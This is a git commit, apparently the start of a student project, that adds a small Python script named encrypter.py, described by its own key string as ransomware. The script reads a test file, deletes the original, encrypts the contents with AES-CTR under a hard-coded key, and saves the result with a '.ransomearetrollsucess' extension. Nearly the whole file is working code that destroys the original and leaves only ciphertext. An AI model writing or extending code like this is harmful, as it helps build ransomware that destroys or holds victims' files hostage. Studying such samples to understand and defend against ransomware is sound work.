31b21b7635f40fff756b789104681019fcf58da1
Fernando Carvalho <84752008+Fernandoafsc@users.noreply.github.com>
2025-06-01 20:49:23 +0000

    Iniciando o projeto.

---
+++ encrypter.py
@@ -0,0 +1,32 @@
+import os
+import pyaes
+
+## Abrir o arquivo a ser criptografado
+
+## Abrir o arquivo criptografado
+
+file_name = 'teste.txt'
+file = open(file_name, 'rb')
+file_data = file.read()
+file.close()
+
+## Remover o arquivo original
+
+os. remove(file_name)
+
+## Definir a chave de encriptação
+
+
+key = b'testeransomwares'
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## Criptografar o arquivo
+
+crypto_data = aes.encrypt(file_data)
+
+## Salvar o arquivo criptografado
+
+new_file =  file_name + '.ransomearetrollsucess'
+new_file = open(f'{new_file}', 'wb')
+new_file.write(crypto_data)
+new_file.close()
